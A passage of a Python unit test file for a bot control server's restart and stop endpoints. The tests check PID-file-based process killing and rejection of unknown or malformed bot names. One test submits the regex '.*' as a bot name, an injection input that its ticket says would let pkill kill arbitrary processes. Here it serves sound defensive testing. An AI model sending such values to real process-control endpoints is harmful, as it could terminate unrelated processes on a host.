        mock_bot.name = "valid_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            with patch("codebot.control_server.STATE_DIR"):
                handler = self._make_handler("POST", "/bots/valid_bot/restart")
                responses = []
                handler._json = lambda code, data, r=responses: r.append((code, data))
                handler._auth = lambda: True
                handler._read_json_body = lambda: ({"force": True}, None, None)

                with patch("codebot.control_server._safe_kill_bot_process", return_value=(True, [1234])) as mock_safe_kill, \
                     patch("codebot.control_server.subprocess.Popen") as mock_popen:
                    ControlHandler.do_POST(handler)
                    # Verify safe kill was called with validated bot name
                    mock_safe_kill.assert_called_once_with("valid_bot", timeout=5)
                    mock_popen.assert_called_once()

                self.assertTrue(len(responses) > 0)
                status_code, body = responses[0]
                self.assertEqual(status_code, 200)
                self.assertTrue(body["ok"])

    @patch("codebot.control_server.BOT_REGISTRY", [type("B", (), {"name": "test-bot"})()])
    def test_restart_uses_pid_file_based_kill(self):
        """Verify that _safe_kill_bot_process uses PID file + cmdline verification.
        
        Updated for CB-3FA9A: The secure implementation uses PID files +
        _verify_cmdline instead of pgrep/pkill. This test verifies the
        PID-file-based path is used.
        """
        from codebot.control_server import _safe_kill_bot_process

        with patch("codebot.control_server._read_pid_file", return_value=1234) as mock_rpf, \
             patch("codebot.control_server._verify_cmdline", return_value=True) as mock_vc, \
             patch("codebot.control_server._atomic_signal_pid", return_value=True) as mock_sig, \
             patch("codebot.control_server.STATE_DIR") as mock_sd:
            mock_pf = MagicMock()
            mock_pf.exists.return_value = True
            mock_sd.__truediv__.return_value = mock_pf
            _safe_kill_bot_process("test-bot", timeout=3)
            
            # Verify PID file was read and cmdline verified
            mock_rpf.assert_called_once_with("test-bot")
            mock_vc.assert_called_once_with(1234, "test-bot")
            mock_sig.assert_called_once()

    def test_stop_unknown_bot_returns_400(self):
        """POST /bots/stop with unknown bot name returns 400.
        
        Ticket: CB-990023-1087 / CB-949FF — Missing input validation on /bots/stop allows
        arbitrary process killing via pkill regex. Unknown bots must return 400
        (not 404) to prevent enumeration and argument injection, aligning with /bots/start.
        """
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "valid-bot"

        handler = self._make_handler("POST", "/bots/stop", body={"bots": ["nonexistent"], "force": True})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["nonexistent"], "force": True}, None, None)

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]), \
             patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400, f"Expected 400 for unknown bot, got {status_code}")
        self.assertIn("unknown bot", body.get("error", "").lower())


    def test_stop_regex_injection_returns_400(self):
        """POST /bots/stop with regex pattern like \".*\" returns 400.
        
        Ticket: CB-990023-1087 — Missing input validation on /bots/stop allows
        arbitrary process killing via pkill regex. Regex patterns must be rejected
        by validate_bot_name() which only allows [a-zA-Z0-9_-]+.
        """
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "valid-bot"

        handler = self._make_handler("POST", "/bots/stop", body={"bots": [".*"], "force": True})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": [".*"], "force": True}, None, None)

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]), \
             patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        # ".*" fails validate_bot_name() because it contains '.' and '*'
        # which are not in [a-zA-Z0-9_-]+
        self.assertEqual(status_code, 400, f"Expected 400 for regex pattern, got {status_code}")
        self.assertIn("invalid bot name", body.get("error", "").lower())


class TestRestartEndpointPytestMock:
    """Tests using pytest-mock to verify restart endpoint returns 404 for unknown bots.

    Ticket: CB-99E2D — Tests verify restart endpoint returns 404 for unknown bot
    without calling Popen. Uses pytest-mock per acceptance criteria.
    """

    def _send_post(self, mocker, path: str, body: dict | None = None):
        """Helper to simulate POST request via mocked handler."""
        from codebot.control_server import ControlHandler
        import json as _json

        handler = mocker.MagicMock(spec=ControlHandler)
        handler.path = path
        handler.command = "POST"
        handler.headers = {"Authorization": "Bearer test-token"}

        responses = []

        def capture_json(code, data, extra_headers=None):
            responses.append((code, data))

        handler._json = capture_json
        handler._auth = lambda: True

        if body is not None:
            handler._read_json_body = lambda: (body, None, None)
        else:
            handler._read_json_body = lambda: (None, None, None)

        return handler, responses

    def test_restart_unknown_bot_returns_404_no_popen_with_force(self, mocker):
        """POST /bots/unknown_bot/restart with force=true returns 404 and does NOT call Popen."""
        # Patch BOT_REGISTRY to be empty so 'unknown_bot' is not found
        mocker.patch("codebot.control_server.BOT_REGISTRY", [])
        # Patch subprocess.Popen to track calls
        mock_popen = mocker.patch("codebot.control_server.subprocess.Popen")

        handler, responses = self._send_post(
            mocker,
            "/bots/unknown_bot/restart",
            body={"force": True},
        )

        from codebot.control_server import ControlHandler
        ControlHandler.do_POST(handler)

        assert len(responses) > 0, "Handler must produce a response"
        status_code, body = responses[0]
        assert status_code == 404, f"Expected 404 for unknown bot, got {status_code}"
        assert "unknown bot" in body.get("error", "").lower()
        # Critical assertion: Popen must NOT have been called
        assert mock_popen.call_count == 0, (
            f"subprocess.Popen must not be called for unknown bot, "
            f"but was called {mock_popen.call_count} times"
        )

    def test_restart_unknown_bot_returns_404_no_popen_without_force(self, mocker):
        """POST /bots/unknown_bot/restart without force flag returns 404 and does NOT call Popen."""
        mocker.patch("codebot.control_server.BOT_REGISTRY", [])
        mock_popen = mocker.patch("codebot.control_server.subprocess.Popen")

        handler, responses = self._send_post(
            mocker,
            "/bots/unknown_bot/restart",
            body={},  # No force flag
        )

        from codebot.control_server import ControlHandler
        ControlHandler.do_POST(handler)

        assert len(responses) > 0, "Handler must produce a response"
        status_code, body = responses[0]
        # Without force, should still reject unknown bot with 404 before requiring force
        assert status_code == 404, f"Expected 404 for unknown bot, got {status_code}"
        assert "unknown bot" in body.get("error", "").lower()
        # Popen must NOT have been called
        assert mock_popen.call_count == 0, (
            f"subprocess.Popen must not be called for unknown bot, "
            f"but was called {mock_popen.call_count} times"
        )


if __name__ == "__main__":
    unittest.main()
